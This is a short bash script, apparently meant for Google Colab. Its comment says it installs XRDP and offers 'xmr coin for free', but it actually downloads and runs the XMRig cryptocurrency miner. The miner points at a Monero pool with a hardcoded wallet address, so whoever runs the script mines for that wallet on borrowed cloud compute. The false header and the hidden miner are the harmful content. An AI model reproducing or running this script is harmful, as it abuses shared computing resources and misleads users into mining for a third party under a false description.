#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o us-west.minexmr.com:443 -u 8486MBHLciNZFca2XgpcnsC4T6jMp1F543pifXGzRNJQFtnutJQyoGRTjVi58N3xSrUXLWQ4PL8puKfGap6GmKS6EHR8W2h -k --tls --rig-id GC-US
